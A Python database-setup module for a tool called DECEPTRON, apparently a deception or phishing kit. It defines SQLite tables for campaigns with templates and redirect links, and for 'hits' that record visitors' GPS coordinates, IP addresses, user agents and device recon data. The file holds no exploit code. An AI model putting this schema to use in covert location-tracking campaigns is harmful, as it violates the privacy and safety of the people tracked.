#!/usr/bin/env python3
"""DECEPTRON v1.2 — DB initialization (shared by setup.sh, server.py, generate.py)."""
import json, os, sqlite3

def db_path():
    if os.path.exists("config.json"):
        with open("config.json") as f:
            return json.load(f).get("db_path", "db/hits.db")
    return "db/hits.db"

def init_db(path=None):
    path = path or db_path()
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    conn = sqlite3.connect(path)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS hits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        campaign_id TEXT, session_id TEXT,
        latitude REAL, longitude REAL, accuracy REAL,
        user_agent TEXT, ip TEXT,
        timestamp INTEGER DEFAULT (strftime('%s','now')),
        processed BOOLEAN DEFAULT 0)""")
    # v1.2: extra device recon column (JSON)
    cols = [r[1] for r in c.execute("PRAGMA table_info(hits)")]
    if cols and "extras" not in cols:
        c.execute("ALTER TABLE hits ADD COLUMN extras TEXT DEFAULT '{}'")
    c.execute("""CREATE TABLE IF NOT EXISTS campaigns (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT UNIQUE, template_type TEXT, redirect_url TEXT, link TEXT,
        created_at INTEGER DEFAULT (strftime('%s','now')))""")
    c.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id TEXT PRIMARY KEY, campaign_id TEXT,
        first_seen INTEGER, last_seen INTEGER, hit_count INTEGER DEFAULT 1)""")
    conn.commit()
    conn.close()
    return path

if __name__ == "__main__":
    print(f"[+] DB ready: {init_db()}")